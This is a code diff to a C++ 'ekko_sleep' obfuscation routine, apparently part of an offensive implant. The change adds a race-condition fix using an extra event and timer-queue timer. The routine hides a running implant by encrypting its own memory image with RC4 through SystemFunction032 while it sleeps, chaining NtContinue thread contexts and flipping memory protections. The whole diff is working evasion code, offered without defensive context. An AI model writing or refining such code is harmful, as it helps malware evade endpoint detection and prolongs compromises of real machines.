@@ -19,6 +19,7 @@ obfus::ekko_sleep(const uint32_t sleep_time, void* image_base, const uint32_t im
 
     static HANDLE hEvent = nullptr;
     HANDLE hNewTimer     = nullptr;
+    HANDLE hPreventRace  = nullptr;
     HANDLE hTimerQueue   = CreateTimerQueue();
     uint32_t old_protect = 0;
 
@@ -29,6 +30,13 @@ obfus::ekko_sleep(const uint32_t sleep_time, void* image_base, const uint32_t im
 
     //----------------------------------------------------------------------------------------------------//
 
+    hPreventRace = CreateEventW(
+        nullptr,
+        FALSE,
+        FALSE,
+        nullptr
+    );
+
     if(hEvent == nullptr) {
         hEvent = CreateEventW(
             nullptr,
@@ -38,16 +46,19 @@ obfus::ekko_sleep(const uint32_t sleep_time, void* image_base, const uint32_t im
         );
     }
 
-    if (!hEvent || !pRtlCaptureContext || !pNtContinue || !pSystemFunction032 || !hTimerQueue) {
+    if (!hEvent || !pRtlCaptureContext || !pNtContinue || !pSystemFunction032 || !hTimerQueue || !hPreventRace) {
+        DEBUG_PRINT("[!] Ekko sleep obf failed. Null stack variables.");
         return;
     }
 
-    key.Buffer = byte_buffer;
-    key.Length = 16;
+    //----------------------------------------------------------------------------------------------------//
+
+    key.Buffer        = byte_buffer;
+    key.Length        = 16;
     key.MaximumLength = 16;
 
-    image.Buffer = image_base;
-    image.Length = image_size;
+    image.Buffer        = image_base;
+    image.Length        = image_size;
     image.MaximumLength = image_size;
 
     init_rc4_key(&key);
@@ -61,7 +72,23 @@ obfus::ekko_sleep(const uint32_t sleep_time, void* image_base, const uint32_t im
         WT_EXECUTEINTIMERTHREAD
     )) {
 
-        WaitForSingleObject(hEvent, 0x32);
+        if(!CreateTimerQueueTimer(
+            &hNewTimer,
+            hTimerQueue,
+            (WAITORTIMERCALLBACK)SetEvent,
+            hPreventRace,
+            200,
+            0,
+            WT_EXECUTEINTIMERTHREAD
+        )) {
+            DEBUG_PRINT("[!] Failed to prevent Ekko race condition!");
+            return;
+        }
+
+        WaitForSingleObject(hPreventRace, INFINITE);
+        CloseHandle(hPreventRace);
+
+
         memcpy(&ctx_protrw,     &ctx_curthread, sizeof(CONTEXT));
         memcpy(&ctx_protrwx,    &ctx_curthread, sizeof(CONTEXT));
         memcpy(&ctx_decrypt,    &ctx_curthread, sizeof(CONTEXT));
